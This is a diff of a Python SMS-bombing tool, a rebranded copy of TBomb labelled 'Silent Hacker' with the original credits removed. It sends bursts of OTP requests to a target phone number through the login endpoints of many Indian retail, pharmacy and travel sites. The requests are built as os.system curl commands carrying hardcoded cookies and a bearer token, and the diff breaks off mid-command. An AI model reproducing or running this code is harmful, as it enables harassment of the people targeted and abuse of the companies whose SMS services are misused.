@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 from datetime import datetime
+from termcolor import cprint
 import os
 import hashlib
 import sys
@@ -18,10 +19,7 @@ except ImportError:
     print('Type \'pip install -r requirements.txt\' to install all required packages')
     exit()
 
-colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
-W='\033[0m'
-# The Credit For This Code Goes To SpeedX And All Other Contributors Listed At https://github.com/TheSpeedX/TBomb
-# If You Wanna Take Credits For This Code, Please Look Yourself Again
+# If You Wanna Take Credits For This Code, Please Look Yourrself Again
 
 country_codes = {
     '93': 'AF',
@@ -230,30 +228,16 @@ country_codes = {
     '263': 'ZW'
 }
 
-
-def clr():
-    if os.name == 'nt':
-        os.system('cls')
-    else:
-        os.system('clear')
-def banner():
+############################
+print ("                                                                             ")
+print (" ░█▀▀▀█ ▀█▀ ░█─── ░█▀▀▀ ░█▄─░█ ▀▀█▀▀ 　 ░█─░█ ─█▀▀█ ░█▀▀█ ░█─▄▀ ░█▀▀▀ ░█▀▀█  ")
+print (" ─▀▀▀▄▄ ░█─ ░█─── ░█▀▀▀ ░█░█░█ ─░█── 　 ░█▀▀█ ░█▄▄█ ░█─── ░█▀▄─ ░█▀▀▀ ░█▄▄▀  ")
+print (" ░█▄▄▄█ ▄█▄ ░█▄▄█ ░█▄▄▄ ░█──▀█ ─░█── 　 ░█─░█ ░█─░█ ░█▄▄█ ░█─░█ ░█▄▄▄ ░█─░█  ")       
+print ("                                                                             ")
+print ("                                         # Owner is Silent-Hacker          \n")
+    print()
     
-    clr()
-    logo="""                                                  
-   ████████ ██████                 ██             
-   ▒▒▒██▒▒▒ ██▒▒▒██                ██             
-      ██    ██   ██  ████  ██   ██ ██             
-      ██    ██████▒ ██▒▒██ ███ ███ █████          
-      ██    ██▒▒▒██ ██  ██ ██▒█▒██ ██▒▒██         
-      ██    ██   ██ ██  ██ ██ ▒ ██ ██  ██         
-      ██    ██████▒ ▒████▒ ██   ██ █████▒         
-      ▒▒    ▒▒▒▒▒▒   ▒▒▒▒  ▒▒   ▒▒ ▒▒▒▒▒          
-                                         """
-    print(random.choice(colors)+logo+W)
-    print("\n")
-
-
-
+# Counts Number Of SMS in Infinite Mode
 count_inf = 0
 
 
@@ -283,8 +267,7 @@ def infinite(pn, dl, ch, max):
 def checkinternet():
     res = False
     try:
-        # requests.get('https://www.google.com', verify=True)
-        requests.get('https://www.google.com')
+        requests.get('https://www.google.com', verify=True)
         res = False
     except Exception:
         res = True
@@ -294,9 +277,11 @@ def checkinternet():
         banner()
         exit()
 
-def getapi(pn,lim,cc):
-    cc=str(cc)
-    pn=str(pn)
+
+def getapi(pn, lim, cc):
+    global country_codes
+    cc = str(cc).strip()
+    cnn = country_codes[cc]
     lim = int(lim)
     url = ["https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" +
            str(cc) + "&nod=4&phone=" + pn, "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn]
@@ -307,362 +292,70 @@ def getapi(pn,lim,cc):
     except (urllib.error.HTTPError, urllib.error.URLError):
         return False
     if lim == 3:
-        headers = {
-            'Host': 'pharmeasy.in',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Referer': 'https://pharmeasy.in/',
-            'Content-Type': 'application/json',
-            'Content-Length': '30',
-            'Connection': 'keep-alive',
-        }
-
-        data = {"contactNumber":pn}
-
-        response = requests.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data)
-        return response.status_code==200
+        os.system('curl -s -X POST -H "Host:m.netmeds.com" -H "content-length:76" -H "accept:*/*" -H "origin:https://m.netmeds.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://m.netmeds.com/customer/account/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:checkmobileno-popup=quWqfunF" -H "cookie:section_data_ids=%7B%22cart%22%3A1559721914%2C%22directory-data%22%3A1559721853%7D" -H "cookie:mage-messages=" -H "cookie:_gat_UA-63910444-1=1" -H "cookie:_gac_UA-63910444-1=1.1559721866.CjwKCAjw0N3nBRBvEiwAHMwvNuYvgGcnYSdAie5_0MBknXSXxfrtAQ-otjvqdbr_MPyAf56mFqwQTxoChEUQAvD_BwE" -H "cookie:_gcl_aw=GCL.1559721866.CjwKCAjw0N3nBRBvEiwAHMwvNuYvgGcnYSdAie5_0MBknXSXxfrtAQ-otjvqdbr_MPyAf56mFqwQTxoChEUQAvD_BwE" -H "cookie:_nmstracking=| sms | ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsUTMtrackingsource=ADW-CPC-Search-NMS-Brand-OC&ADW-CPC-Search-NMS-Brand-OC&CPC&ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsCampaign=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsMedium=CPC" -H "cookie:_nmsSource=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsAttr=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:private_content_version=eef016e2f8225f631d4a6e1cf8cdf4ac" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:form_key=YGWpwHiCN5uglOtY" -H "cookie:_gid=GA1.3.93227781.1559647218" -H "cookie:mage-translation-file-version=%7B%7D" -H "cookie:mage-translation-storage=%7B%7D" -H "cookie:_gcl_au=1.1.656472353.1559647214" -H "cookie:PHPSESSID=b5i36rg02l2jg9cielmm9fl7c6" -H "cookie:cto_lwid=e5917844-4f1b-48f9-bf74-b0bfdd5c79ce" -H "cookie:bsCoId=3558720339100" -H "cookie:bsUl=0" -H "cookie:_fbp=fb.1.1558720332185.799068042" -H "cookie:_ga=GA1.3.185497001.1558720330" -d \'register_mobileno=' + pn + '&logintype=Otp&uniq_identy=quWqfunF&forget_pwd=N\' "https://m.netmeds.com/sociallogin/popup/nmsgetcode/"  > /dev/null 2>&1')
+        return True
     elif lim == 4:
-        cookies = {
-        '_ga': 'GA1.2.1273460610.1561191565',
-        '_gid': 'GA1.2.172574299.1561191565',
-        '_gcl_au': '1.1.833556660.1561191566',
-        '_fbp': 'fb.1.1561191568709.1707722126',
-        'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
-        }
-        headers={
-            'Host': 'www.heromotocorp.com',
-            'Connection': 'keep-alive',
-            'Content-Length': '126',
-            'Accept': '*/*',
-            'Origin': 'https://www.heromotocorp.com',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Save-Data': 'on',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
-            }
-
-        data = {
-          'mobile_no': pn,
-          'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
-          'mobile_no_otp': '',
-          'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
-        }
-
-        response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
-
-        return response.status_code==200
+        os.system(
+            'curl -s -X POST -H "Host:client-api.goomo.com" -H "origin:https://www.goomo.com" -H "client:m-web" -H "x-goomo-platform:mWeb" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.goomo.com/hotels" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -d \'{"email":"fakeemail@gmail.com","phone_number":"' + pn + '","country_code":"' + cc + '"}\' "https://client-api.goomo.com/v2/phone_confirmation/verify_user" > /dev/null 2>&1')
+        return True
     elif lim == 5:
-        cookies = {
-            'Cookie:_ga': 'GA1.2.1483885314.1559157646',
-            '_fbp': 'fb.1.1559157647161.1989205138',
-            'TiPMix': '91.9909185226964',
-            'gcb_t_track': 'SEO - Google',
-            'gcb_t_keyword': '',
-            'gcb_t_l_url': 'https://www.google.com/',
-            'gcb_utm_medium': '',
-            'gcb_utm_campaign': '',
-            'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs',
-            'web_app_landing_utm_source': '',
-            'web_app_landing_url': '/personal-loan',
-            'webapp_landing_referral_url': 'https://www.google.com/',
-            'ARRAffinity': '747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417',
-            '_gid': 'GA1.2.969623705.1560660444',
-            '_gat': '1',
-            'current_url': 'https://indialends.com/personal-loan',
-            'cookies_plbt': '0',
-        }
-
-        headers = {
-            'Host': 'indialends.com',
-            'Connection': 'keep-alive',
-            'Content-Length': '75',
-            'Accept': '*/*',
-            'Origin': 'https://indialends.com',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Save-Data': 'on',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Referer': 'https://indialends.com/personal-loan',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
-        }
-
-        data = {
-          'aeyder03teaeare': '1',
-          'ertysvfj74sje': cc,
-          'jfsdfu14hkgertd': pn,
-          'lj80gertdfg': '0'
-        }
-
-        response = requests.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data)
+        os.system('curl -s -X POST -H "Accept:*/*" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.5" -H "Connection:keep-alive" -H "Content-Length:34" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:www.oriyamatrimony.com" -H "Referer:https://www.oriyamatrimony.com/" -H "User-Agent:Mozilla/5.0 (Windows NT 8.1; Win64; x64; rv:59.0) Gecko/20 Firefox/56.0" -H "X-Requested-With:XMLHttpRequest" -d "countrycode=' +
+                  cc + '&mobileno=' + pn + '" "https://www.oriyamatrimony.com/login/mobileappsms-homepage.php"  > /dev/null 2>&1')
         return True
     elif lim == 6:
-        headers = {
-        'host': 'www.flipkart.com',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.5',
-        'accept-encoding': 'gzip, deflate, br',
-        'referer': 'https://www.flipkart.com/',
-        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop',
-        'origin': 'https://www.flipkart.com',
-        'connection': 'keep-alive',
-        'Content-Type': 'application/json; charset=utf-8'}
-
-        data = {"loginId":["+"+cc+pn],"supportAllStates":true}
-
-        response = requests.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data)
+        os.system(
+            'curl -s -X POST -H "host:www.flipkart.com" -H "user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" -H "accept:*/*" -H "accept-language:en-US,en;q=0.5" -H "accept-encoding:gzip, deflate, br" -H "referer:https://www.flipkart.com/" -H "x-user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop" -H "origin:https://www.flipkart.com" -H "connection:keep-alive" -H "Content-Type:application/json; charset=utf-8" -H "Content-Length:53" -d \'{"loginId":["+' + cc + pn + '"],"supportAllStates":true}\' "https://www.flipkart.com/api/6/user/signup/status"  > /dev/null 2>&1')
         return True
     elif lim == 7:
-        cookies = {
-        'Cookie:T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050',
-        'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
-        'lux_uid': '155867904381892986',
-        'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
-        'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI',
-        's_cc': 'true',
-        'SN': '2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078',
-        'gpv_pn': 'HomePage',
-        'gpv_pn_t': 'Homepage',
-        'S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==',
-        's_sq': '%5B%5BB%5D%5D'}
-
-        headers = {
-            'Host': 'www.flipkart.com',
-            'Connection': 'keep-alive',
-            'Content-Length': '60',
-            'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
-            'Origin': 'https://www.flipkart.com',
-            'Save-Data': 'on',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': '*/*',
-            'Referer': 'https://www.flipkart.com/',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
-        }
-
-        data = {
-          'loginId': '+'+cc+pn,
-          'state': 'VERIFIED',
-          'churnEmailRequest': 'false'
-        }
-
-        response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
+        os.system('curl -s -X POST -H "Host:www.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:60" -H "X-user-agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop" -H "Origin:https://www.flipkart.com" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:T=BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050; SWAB=build-44be9e47461a74d737914207bcbafc30; lux_uid=155867904381892986; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_cc=true; SN=2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078; gpv_pn=HomePage; gpv_pn_t=Homepage; S=d1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==; s_sq=%5B%5BB%5D%5D" -d \'loginId=+' + cc + pn + '&state=VERIFIED&churnEmailRequest=false\' "https://www.flipkart.com/api/5/user/otp/generate"  > /dev/null 2>&1')
         return True
     elif lim == 8:
-        headers = {
-            'Host': 'www.ref-r.com',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Content-Length': '26',
-            'DNT': '1',
-            'Connection': 'keep-alive',
-        }
-
-        data = {
-          'mobile': pn,
-          'submit': '1',
-          'undefined': ''
-        }
-
-        response = requests.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data)
+        os.system('curl -s -X POST -H "Host:www.ref-r.com" -H "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Accept-Language:en-US,en;q=0.5" -H "Accept-Encoding:gzip, deflate, br" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With:XMLHttpRequest" -H "Content-Length:26" -H "DNT:1" -H "Connection:keep-alive" -d "mobile=' + pn + '&submit=1&undefined=" "https://www.ref-r.com/clients/lenskart/smsApi"  > /dev/null 2>&1')
         return True
     elif lim == 9:
-
-        headers = {
-            'X-DROID-VERSION': '4.12.5',
-            'API-Version': '2.0',
-            'user-agent': 'samsung SM-G9350 0 4.4.2',
-            'client-version': 'Android-4.12.5',
-            'X-DROID-VERSION-CODE': '158',
-            'Accept': 'application/json',
-            'client-name': 'Practo Android App',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': 'accounts.practo.com',
-            'Connection': 'Keep-Alive',
-            'Content-Length': '96'}
-
-        data = {
-          'client_name': 'Practo Android App',
-          'mobile': '+'+cc+pn,
-          'fingerprint': '',
-          'device_name':'samsung+SM-G9350'}
-        response = requests.post( "https://accounts.practo.com/send_otp", headers=headers, data=data)
-        rd=response.text
-        # rd = os.popen('curl -s -X POST -H "X-DROID-VERSION:4.12.5" -H "API-Version:2.0" -H "user-agent:samsung SM-G9350 0 4.4.2" -H "client-version:Android-4.12.5" -H "X-DROID-VERSION-CODE:158" -H "Accept:application/json" -H "client-name:Practo Android App" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:accounts.practo.com" -H "Connection:Keep-Alive" -H "Content-Length:96" -d  "client_name=Practo+Android+App&fingerprint=&mobile=%2B' + cc + pn + '&device_name=samsung+SM-G9350&"  "https://accounts.practo.com/send_otp"').read()
+        rd = os.popen('curl -s -X POST -H "X-DROID-VERSION:4.12.5" -H "API-Version:2.0" -H "user-agent:samsung SM-G9350 0 4.4.2" -H "client-version:Android-4.12.5" -H "X-DROID-VERSION-CODE:158" -H "Accept:application/json" -H "client-name:Practo Android App" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:accounts.practo.com" -H "Connection:Keep-Alive" -H "Content-Length:96" -d  "client_name=Practo+Android+App&fingerprint=&mobile=%2B' + cc + pn + '&device_name=samsung+SM-G9350&"  "https://accounts.practo.com/send_otp"').read()
         return rd.find("success") != -1
     elif lim == 10:
-
-        headers = {
-            'Host': 'm.pizzahut.co.in',
-            'content-length': '114',
-            'origin': 'https://m.pizzahut.co.in',
-            'authorization': 'Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5pTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4',
-            'x-source-origin': 'PWAFW',
-            'content-type': 'application/json',
-            'accept': 'application/json, text/plain, */*',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-            'save-data': 'on',
-            'languagecode': 'en',
-            'referer': 'https://m.pizzahut.co.in/login',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
-            'cookie': 'AKA_A2=A'}
-        data = {"customer":{"MobileNo":pn,"UserName":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}
-
-        response = requests.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, data=data)
+        os.system(
+            'curl -s -X POST -H "Host:m.pizzahut.co.in" -H "content-length:114" -H "origin:https://m.pizzahut.co.in" -H "authorization:Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5pTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4" -H "x-source-origin:PWAFW" -H "content-type:application/json" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "save-data:on" -H "languagecode:en" -H "referer:https://m.pizzahut.co.in/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_fbp=fb.2.1559973905081.1516144968" -H "cookie:_gat_UA-37858192-4=1" -H "cookie:_ga-ss=1|UA-37858192-4|https%3A%2F%2Fwww.google.com%2F" -H "cookie:_gid=GA1.3.1666290082.1559973902" -H "cookie:_ga=GA1.3.1893416092.1559973902" -H "cookie:run_fullstory_for_user=full_story_fail" -H "cookie:_gcl_au=1.1.2020385110.1559973902" -H "cookie:AKA_A2=A" -d \'{"customer":{"MobileNo":"' + pn + '","UserName":"' + pn + '","merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}\' "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en"  > /dev/null 2>&1')
         return True
     elif lim == 11:
-        headers = {
-            'host': 'www.goibibo.com',
-            'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.5',
-            'accept-encoding': 'gzip, deflate, br',
-            'referer': 'https://www.goibibo.com/mobile/?sms=success',
-            'content-type': 'application/x-www-form-urlencoded',
-            'content-length': '14',
-            'connection': 'keep-alive',
-            'upgrade-insecure-requests': '1'}
-
-        data = {'mbl': pn}
-
-        response = requests.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data)
+        os.system('curl -s -X POST -H "host:www.goibibo.com" -H "user-agent:Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "accept-language:en-US,en;q=0.5" -H "accept-encoding:gzip, deflate, br" -H "referer:https://www.goibibo.com/mobile/?sms=success" -H "content-type:application/x-www-form-urlencoded" -H "content-length:14" -H "connection:keep-alive" -H "upgrade-insecure-requests:1" -d "mbl=' + pn + '" "https://www.goibibo.com/common/downloadsms/"  > /dev/null 2>&1')
         return True
     elif lim == 12:
-        headers = {
-        'Host': 'www.apollopharmacy.in',
-        'content-length': '17',
-        'accept': '*/*',
-        'origin': 'https://www.apollopharmacy.in',
-        'x-requested-with': 'XMLHttpRequest',
-        'save-data': 'on',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
-        'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'}
-
-        data = {'mobile': pn}
-
-        response = requests.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data)
-        rd=response.text
+        os.popen('rm temp.xxx1 > /dev/null 2>&1')
+        os.system(
+            'curl -s -X POST -H "Host:www.apollopharmacy.in" -H "content-length:17" -H "accept:*/*" -H "origin:https://www.apollopharmacy.in" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.apollopharmacy.in/sociallogin/mobile/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:__cfduid=d64c65a2edad54086382759cdf599de901558686615" -H "cookie:_ga=GA1.2.1278908803.1558686621" -H "cookie:__ta_device=fAz8eA9Rx40yyIiB5mzvHt4apFaSkMBA" -H "cookie:_fbp=fb.1.1558686627127.655454618" -H "cookie:__stat="BLOCK"" -H "cookie:jv_visits_count_EXRKNIzFkV=1" -H "cookie:__stp={"visit":"returning","uuid":"d9a1c39d-efbd-4911-ac0e-6333455f9fbb"}" 